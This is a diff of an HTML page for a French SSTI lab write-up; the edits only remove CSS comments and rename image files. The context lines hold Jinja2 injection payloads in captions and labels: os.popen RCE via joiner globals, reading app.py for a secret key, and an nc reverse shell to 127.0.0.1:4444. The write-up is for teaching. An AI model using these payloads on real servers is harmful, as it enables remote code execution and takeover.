@@ -47,11 +47,9 @@
 
   img { max-width: 100%; height: auto; display: block; }
 
-  /* ── PROGRESS ── */
   .progress-bar { position: fixed; top: 0; left: 0; right: 0; height: 3px; z-index: 700; background: var(--border); }
   .progress-fill { height: 100%; width: 0%; max-width: 100%; background: linear-gradient(90deg, var(--cyan), var(--blue)); box-shadow: 0 0 8px var(--cyan-glow); transition: width .1s linear; }
 
-  /* ── BACK HOME ── */
   .back-home {
     position: fixed; top: calc(1.2rem + var(--safe-t)); left: calc(1.2rem + var(--safe-l)); z-index: 600;
     display: inline-flex; align-items: center; gap: .5rem; padding: .6rem 1.05rem; min-height: 44px;
@@ -63,7 +61,6 @@
   .back-home:hover, .back-home:active { border-color: var(--cyan); color: var(--cyan); box-shadow: 0 0 16px var(--cyan-glow); }
   .back-home svg { width: 14px; height: 14px; flex-shrink: 0; }
 
-  /* ── SIDEBAR ── */
   .sidebar {
     position: fixed; left: 0; top: 0; width: 64px; height: 100vh;
     display: flex; flex-direction: column; align-items: center; justify-content: center;
@@ -78,7 +75,6 @@
   }
   .phase-dot:hover, .phase-dot.active { border-color: var(--cyan); color: var(--cyan); box-shadow: 0 0 12px var(--cyan-glow); background: var(--cyan-dim); }
 
-  /* ── MOBILE NAV ── */
   .mobile-nav {
     display: none; position: fixed; bottom: 0; left: 0; right: 0; z-index: 650;
     background: rgba(15,21,37,.95); -webkit-backdrop-filter: blur(14px); backdrop-filter: blur(14px);
@@ -94,11 +90,9 @@
   }
   .mobile-nav-item.active { border-color: var(--cyan); color: var(--cyan); background: var(--cyan-dim); }
 
-  /* ── MAIN LAYOUT ── */
   main { margin-left: 64px; width: calc(100% - 64px); padding: 0 2rem 6rem; }
   .inner { max-width: 920px; margin: 0 auto; }
 
-  /* ── HERO ── */
   .hero { padding: calc(5.5rem + var(--safe-t)) 0 4rem; position: relative; }
   .hero-eyebrow {
     font-family: 'JetBrains Mono', monospace; font-size: 11px; letter-spacing: .18em; text-transform: uppercase;
@@ -132,7 +126,6 @@
   }
   .publish-date svg { width: 13px; height: 13px; color: var(--cyan); flex-shrink: 0; }
 
-  /* ── SHARE BAR ── */
   .share-section { margin-top: 1.8rem; }
   .share-label { font-family: 'JetBrains Mono', monospace; font-size: .7rem; letter-spacing: .15em; text-transform: uppercase; color: var(--muted); margin-bottom: .7rem; }
   .share-bar { display: flex; flex-wrap: wrap; gap: .6rem; }
@@ -146,7 +139,6 @@
   .share-btn svg { width: 17px; height: 17px; }
   .share-btn.copied { border-color: var(--cyan); color: var(--cyan); }
 
-  /* ── TOC ── */
   .toc { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 1.5rem 1.6rem; margin: 2rem 0; }
   .toc-title { font-family: 'JetBrains Mono', monospace; font-size: .75rem; letter-spacing: .15em; text-transform: uppercase; color: var(--cyan); margin-bottom: 1rem; }
   .toc-list { list-style: none; display: grid; grid-template-columns: 1fr 1fr; gap: .6rem 1.5rem; }
@@ -154,7 +146,6 @@
   .toc-list a:hover, .toc-list a:active { color: var(--cyan); }
   .toc-num { font-family: 'JetBrains Mono', monospace; font-size: .7rem; color: var(--muted); flex-shrink: 0; }
 
-  /* ── SECTIONS ── */
   .section { padding: 3.5rem 0 2rem; border-bottom: 1px solid var(--border); }
   .section:last-of-type { border-bottom: none; }
 
@@ -168,14 +159,12 @@
   ul.plain, ol.plain { margin: 0 0 1.1rem 1.3rem; color: #b8c3d9; }
   ul.plain li, ol.plain li { margin-bottom: .5rem; }
 
-  /* ── DEF BOX ── */
   .def-box { background: linear-gradient(135deg, #2f9bff0a 0%, #2f9bff03 100%); border: 1px solid var(--blue); border-radius: 10px; padding: 1.3rem 1.4rem; margin: 1.2rem 0 1.6rem; }
   .def-term { display: flex; align-items: center; gap: .6rem; font-family: 'JetBrains Mono', monospace; font-size: .92rem; font-weight: 700; color: var(--blue); margin-bottom: .5rem; flex-wrap: wrap; }
   .def-term::before { content: '§'; font-size: 1.1rem; }
   .def-body { color: #b8c3d9; font-size: .88rem; }
   .def-body code { background: var(--surface2); border: 1px solid var(--border); border-radius: 4px; padding: .1em .4em; color: #c0cce8; font-size: .85em; word-break: break-all; }
 
-  /* ── TERMINAL FRAME (images) ── */
   .terminal-frame { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; margin: 1.5rem 0; box-shadow: 0 8px 40px rgba(0,0,0,.5), 0 0 0 1px rgba(0,212,170,.06); }
   .terminal-bar { background: var(--surface2); padding: .6rem .9rem; display: flex; align-items: center; gap: .5rem; border-bottom: 1px solid var(--border); flex-wrap: wrap; }
   .t-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; }
@@ -186,7 +175,6 @@
   .terminal-caption { padding: .6rem .9rem; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); background: var(--surface2); border-top: 1px solid var(--border); display: flex; align-items: flex-start; gap: .5rem; }
   .terminal-caption::before { content: '▸'; color: var(--cyan); flex-shrink: 0; }
 
-  /* ── CODE WRAP ── */
   .code-wrap { background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; margin: 1rem 0 1.5rem; position: relative; }
   .code-header { background: var(--surface2); padding: .45rem .9rem; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid var(--border); gap: .5rem; }
   .code-lang { font-family: 'JetBrains Mono', monospace; font-size: 10px; letter-spacing: .1em; text-transform: uppercase; color: var(--cyan); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
@@ -206,7 +194,6 @@
   .code-wrap pre .good { color: var(--green); font-weight: 500; }
   .code-wrap pre .muted { color: var(--muted); }
 
-  /* ── BADGES ── */
   .result-badge { display: inline-flex; align-items: flex-start; gap: .5rem; background: #00d4aa0f; border: 1px solid var(--cyan); border-radius: 6px; padding: .6rem 1rem; font-family: 'JetBrains Mono', monospace; font-size: .8rem; color: var(--cyan); margin: .5rem 0 1rem; word-break: break-word; }
   .result-badge::before { content: '✓'; font-weight: 700; flex-shrink: 0; }
   .warn-badge { display: inline-flex; align-items: flex-start; gap: .5rem; background: #ffa5020f; border: 1px solid var(--amber); border-radius: 6px; padding: .6rem 1rem; font-family: 'JetBrains Mono', monospace; font-size: .8rem; color: var(--amber); margin: .5rem 0 1rem; }
@@ -214,7 +201,6 @@
   .blocked-badge { display: inline-flex; align-items: flex-start; gap: .5rem; background: #ff47570f; border: 1px solid var(--red); border-radius: 6px; padding: .6rem 1rem; font-family: 'JetBrains Mono', monospace; font-size: .8rem; color: var(--red); margin: .5rem 0 1rem; }
   .blocked-badge::before { content: '✗'; font-weight: 700; flex-shrink: 0; }
 
-  /* ── TABLE ── */
   .table-wrap { overflow-x: auto; -webkit-overflow-scrolling: touch; margin: 1.2rem 0 1.8rem; border-radius: 8px; border: 1px solid var(--border); }
   table { width: 100%; border-collapse: collapse; font-size: .82rem; min-width: 480px; }
   thead tr { background: var(--surface2); }
@@ -225,21 +211,18 @@
   tbody td { padding: .7rem .9rem; color: #b8c3d9; vertical-align: top; }
   td code, p code, li code { font-family: 'JetBrains Mono', monospace; font-size: .82em; background: var(--surface2); border: 1px solid var(--border); border-radius: 4px; padding: .1em .4em; color: #c0cce8; word-break: break-all; }
 
-  /* ── CHAIN ── */
   .chain { display: flex; flex-wrap: wrap; align-items: center; gap: .4rem; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1.1rem 1.2rem; margin: 1rem 0 1.5rem; }
   .chain-node { font-family: 'JetBrains Mono', monospace; font-size: .74rem; color: var(--text); background: var(--surface2); border: 1px solid var(--border); border-radius: 5px; padding: .35rem .65rem; word-break: break-all; }
   .chain-arrow { font-family: 'JetBrains Mono', monospace; font-size: .9rem; color: var(--cyan); flex-shrink: 0; }
   .chain-node.highlight { border-color: var(--cyan); color: var(--cyan); background: var(--cyan-dim); }
   .chain-node.danger { border-color: var(--red); color: var(--red); background: #ff475711; }
 
-  /* ── DIAGRAM ── */
   .diagram { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 1.5rem; margin: 1.5rem 0; overflow-x: auto; }
   .diagram pre { font-family: 'JetBrains Mono', monospace; font-size: .78rem; line-height: 1.6; color: #c0cce8; background: transparent; border: none; padding: 0; margin: 0; white-space: pre; }
   .d-accent { color: var(--cyan); }
   .d-red { color: var(--red); }
   .d-green { color: var(--green); }
 
-  /* ── STEPS ── */
   .steps { margin: 1.5rem 0; }
   .step { display: flex; gap: 1.1rem; margin-bottom: 2rem; }
   .step-num {
@@ -255,7 +238,6 @@
   .step-body .code-wrap { margin: .8rem 0; }
   .step-body .terminal-frame { margin: .8rem 0; }
 
-  /* ── CALLOUT ── */
   .callout { background: linear-gradient(135deg, #2f9bff0a 0%, #2f9bff03 100%); border: 1px solid var(--blue); border-radius: 10px; padding: 1.2rem 1.4rem; margin: 1.2rem 0 1.6rem; }
   .callout-title { font-family: 'JetBrains Mono', monospace; font-size: .8rem; font-weight: 700; margin-bottom: .5rem; letter-spacing: .05em; color: var(--blue); }
   .callout p { margin-bottom: 0; font-size: .88rem; }
@@ -268,7 +250,6 @@
   .callout-success { border-color: var(--green); background: linear-gradient(135deg, #4ade800a 0%, #4ade8003 100%); }
   .callout-success .callout-title { color: var(--green); }
 
-  /* ── REF GRID ── */
   .ref-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: .8rem; margin-top: 1rem; }
   .ref-card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1rem; text-decoration: none; display: flex; flex-direction: column; gap: .3rem; transition: border-color .2s, box-shadow .2s; min-height: 44px; }
   .ref-card:hover, .ref-card:active { border-color: var(--cyan); box-shadow: 0 0 20px var(--cyan-glow); }
@@ -276,13 +257,11 @@
   .ref-name { font-family: 'JetBrains Mono', monospace; font-size: .78rem; color: var(--cyan); font-weight: 600; }
   .ref-url { font-size: .73rem; color: var(--muted); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
 
-  /* ── FLAG BOX ── */
   .flag-box { background: linear-gradient(135deg, #00d4aa0a 0%, #00d4aa03 100%); border: 1px solid var(--cyan); border-radius: 10px; padding: 1.6rem 1.4rem; text-align: center; position: relative; overflow: hidden; margin: 1.5rem 0; }
   .flag-box::before { content: ''; position: absolute; inset: 0; background: radial-gradient(ellipse at 50% 0%, var(--cyan-glow) 0%, transparent 70%); pointer-events: none; }
   .flag-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; letter-spacing: .2em; text-transform: uppercase; color: var(--muted); margin-bottom: .8rem; }
   .flag-text { font-family: 'JetBrains Mono', monospace; font-size: clamp(.9rem, 3.2vw, 1.2rem); font-weight: 700; color: var(--cyan); letter-spacing: .02em; text-shadow: 0 0 20px var(--cyan-glow); word-break: break-all; }
 
-  /* ── FOOTER ── */
   footer { margin-top: 4rem; padding: 2rem 0; border-top: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 1rem; }
   .footer-author { font-family: 'JetBrains Mono', monospace; font-size: .78rem; color: var(--muted); line-height: 1.8; }
   .footer-author a { color: var(--cyan); text-decoration: none; }
@@ -293,20 +272,17 @@
   .bottom-back { display: inline-flex; align-items: center; gap: .5rem; padding: .7rem 1.2rem; margin-top: .8rem; min-height: 44px; border: 1px solid var(--cyan); border-radius: 8px; color: var(--cyan); text-decoration: none; font-family: 'JetBrains Mono', monospace; font-size: .8rem; background: var(--cyan-dim); transition: all .2s; }
   .bottom-back:hover, .bottom-back:active { box-shadow: 0 0 20px var(--cyan-glow); }
 
-  /* ── SCROLLBAR ── */
   ::-webkit-scrollbar { width: 6px; height: 6px; }
   ::-webkit-scrollbar-track { background: var(--bg); }
   ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
   ::-webkit-scrollbar-thumb:hover { background: var(--muted); }
 
-  /* ── ACCESSIBILITÉ ── */
   a:focus-visible, button:focus-visible { outline: 2px solid var(--cyan); outline-offset: 2px; }
   @media (prefers-reduced-motion: reduce) {
     *, *::before, *::after { transition-duration: 0.01ms !important; animation-duration: 0.01ms !important; scroll-behavior: auto !important; }
     html { scroll-behavior: auto; }
   }
 
-  /* ── RESPONSIVE ── */
   @media (max-width: 900px) {
     main { margin-left: 0; width: 100%; padding: 0 1.6rem 6rem; }
     .sidebar { display: none; }
@@ -475,7 +451,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">Architecture — Moteur de template Jinja2</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/diagram-template-engine.png" alt="Schéma du pipeline de rendu Jinja2 : développeur + données → moteur → HTML" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/Architecture.jpg" alt="Schéma du pipeline de rendu Jinja2 : développeur + données → moteur → HTML" loading="lazy"></div>
       <div class="terminal-caption">Pipeline : template statique + données dynamiques → moteur Jinja2 → HTML généré</div>
     </div>
 
@@ -502,7 +478,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">VSCode — templates/template.html</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/template-html.png" alt="Code source du template Jinja2 dans VSCode" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/codevumn1.jpg" alt="Code source du template Jinja2 dans VSCode" loading="lazy"></div>
       <div class="terminal-caption">Le fichier <code>template.html</code> — variables <code>{{ ... }}</code> et bloc conditionnel <code>{% if %}</code></div>
     </div>
 
@@ -534,7 +510,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">VSCode — ex1.py</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/ex1-py.png" alt="Code source Flask ex1.py dans VSCode" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/photo1pythonex.jpg" alt="Code source Flask ex1.py dans VSCode" loading="lazy"></div>
       <div class="terminal-caption">Le fichier <code>ex1.py</code> — route Flask <code>/profile</code> qui injecte les variables dans le template</div>
     </div>
 
@@ -551,7 +527,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">http://127.0.0.1:5000/profile — Rendu final</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/profile-result.png" alt="Rendu du template Jinja2 avec les variables Flask injectées" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/photo1html.jpg" alt="Rendu du template Jinja2 avec les variables Flask injectées" loading="lazy"></div>
       <div class="terminal-caption">Rendu final — "Bonjour, spectra !" avec message_count et panel admin conditionnel</div>
     </div>
 
@@ -590,7 +566,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">Terminal — Tests locaux vuln.py</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/vuln-py-test.png" alt="Tests locaux : injection arithmétique et tentative {{config}} hors Flask" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/vuln2code.jpg" alt="Tests locaux : injection arithmétique et tentative {{config}} hors Flask" loading="lazy"></div>
       <div class="terminal-caption">Tests : <code>{{ 7*7 }}</code> → 49 · <code>{{ 7*'7' }}</code> → 7777777 · <code>{{config}}</code> → rien (objet Flask absent hors contexte Flask)</div>
     </div>
   </section>
@@ -798,7 +774,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">?name=frinds — Comportement normal</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/test-01-frinds.png" alt="Rendu baseline : Hello frinds !" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/acceuil11.jpg" alt="Rendu baseline : Hello frinds !" loading="lazy"></div>
       <div class="terminal-caption">Baseline : l'input <code>frinds</code> est simplement affiché après "Hello"</div>
     </div>
 
@@ -831,7 +807,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">?name={{7*7}} — Résultat : 49</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/test-02-7x7.png" alt="Test {{7*7}} renvoie Hello 49 — SSTI confirmé" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/pagesweb1.jpg" alt="Test {{7*7}} renvoie Hello 49 — SSTI confirmé" loading="lazy"></div>
       <div class="terminal-caption">L'expression <code>{{7*7}}</code> est évaluée → "Hello 49 !" — SSTI confirmé ✓</div>
     </div>
 
@@ -842,7 +818,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">?name={{7*'7'}} — Résultat : 7777777</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/test-03-7x7str.png" alt="Test {{7*'7'}} renvoie Hello 7777777 — Jinja2 identifié" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/app1.jpg" alt="Test {{7*'7'}} renvoie Hello 7777777 — Jinja2 identifié" loading="lazy"></div>
       <div class="terminal-caption">La multiplication de string donne "7777777" — signature <strong>Jinja2</strong> (Twig aurait retourné 49)</div>
     </div>
 
@@ -915,7 +891,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">?name={{''.__class__.__mro__[1].__subclasses__()}}</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/dump-subclasses.png" alt="Dump complet des sous-classes Python chargées en mémoire" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/rce1.jpg" alt="Dump complet des sous-classes Python chargées en mémoire" loading="lazy"></div>
       <div class="terminal-caption">Dump massif : <code>subprocess.Popen</code>, <code>os._wrap_close</code>, <code>_frozen_importlib.BuiltinImporter</code>... toutes accessibles !</div>
     </div>
 
@@ -954,7 +930,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">?name={{joiner.__init__.__globals__.os.popen("id").read()}}</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/rce-id.png" alt="RCE via joiner — commande id exécutée avec succès" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/rce2.jpg" alt="RCE via joiner — commande id exécutée avec succès" loading="lazy"></div>
       <div class="terminal-caption">RCE confirmé — <code>uid=1000(spectrax) gid=1000(spectrax) groups=1000(spectrax),10(wheel),964(docker)</code></div>
     </div>
 
@@ -972,7 +948,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">?name={{joiner.__init__.__globals__.os.popen("ls -la").read()}}</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/rce-ls.png" alt="Listing du répertoire via RCE — app.py, ssti_blog.html, templates, vuln.py visibles" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/rce3.jpg" alt="Listing du répertoire via RCE — app.py, ssti_blog.html, templates, vuln.py visibles" loading="lazy"></div>
       <div class="terminal-caption">Listing du répertoire de travail — <code>application1.py</code>, <code>app.py</code>, <code>ex1.py</code>, <code>ssti_blog.html</code>, <code>templates/</code>, <code>vuln.py</code></div>
     </div>
 
@@ -990,7 +966,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">?name={{joiner.__init__.__globals__.os.popen("cat app.py").read()}}</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/read-app-flag.png" alt="Lecture d'app.py révélant la SECRET_KEY = MZ{SSTI_M4ST3R_2026}" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/app2.jpg" alt="Lecture d'app.py révélant la SECRET_KEY = MZ{SSTI_M4ST3R_2026}" loading="lazy"></div>
       <div class="terminal-caption">Code source exfiltré — la SECRET_KEY contient le flag : <strong>MZ{SSTI_M4ST3R_2026}</strong></div>
     </div>
 
@@ -1020,7 +996,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">Terminal — Test local vuln.py (self.__init__)</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/vuln-py-rce.png" alt="Test local vuln.py démontrant la RCE via self.__init__.__globals__" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/app3.jpg" alt="Test local vuln.py démontrant la RCE via self.__init__.__globals__" loading="lazy"></div>
       <div class="terminal-caption">Démonstration locale dans <code>vuln.py</code> : <code>self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()</code></div>
     </div>
   </section>
@@ -1264,7 +1240,7 @@ mkdir ssti-lab && cd ssti-lab</pre>
               <div class="t-dot t-dot-green"></div>
               <span class="terminal-bar-label">Terminal — Listener nc -lvnp 4444</span>
             </div>
-            <div class="img-scroll"><img src="../ssti1/reverse-01-nc-setup.png" alt="Listener netcat démarré sur le port 4444" loading="lazy"></div>
+            <div class="img-scroll"><img src="../ssti1/app4.jpg" alt="Listener netcat démarré sur le port 4444" loading="lazy"></div>
             <div class="terminal-caption">Ncat en écoute — prêt à recevoir la connexion sortante de la cible</div>
           </div>
         </div>
@@ -1290,7 +1266,7 @@ mkdir ssti-lab && cd ssti-lab</pre>
               <div class="t-dot t-dot-green"></div>
               <span class="terminal-bar-label">?name={{joiner...popen('nc 127.0.0.1 4444 -e /bin/bash').read()}}</span>
             </div>
-            <div class="img-scroll"><img src="../ssti1/reverse-02-url.png" alt="URL du payload reverse shell dans le navigateur" loading="lazy"></div>
+            <div class="img-scroll"><img src="../ssti1/app5.jpg" alt="URL du payload reverse shell dans le navigateur" loading="lazy"></div>
             <div class="terminal-caption">Payload envoyé via le paramètre GET <code>name</code> — le serveur exécute la commande via <code>os.popen()</code></div>
           </div>
 
@@ -1301,7 +1277,7 @@ mkdir ssti-lab && cd ssti-lab</pre>
               <div class="t-dot t-dot-green"></div>
               <span class="terminal-bar-label">Terminal — Shell connecté</span>
             </div>
-            <div class="img-scroll"><img src="../ssti1/reverse-03-ifconfig.png" alt="Shell interactif reçu — whoami et ifconfig exécutés avec succès" loading="lazy"></div>
+            <div class="img-scroll"><img src="../ssti1/app6.jpg" alt="Shell interactif reçu — whoami et ifconfig exécutés avec succès" loading="lazy"></div>
             <div class="terminal-caption">Shell connecté sur le listener — <code>whoami</code> → spectrax · <code>ifconfig</code> → dump des interfaces réseau</div>
           </div>
 
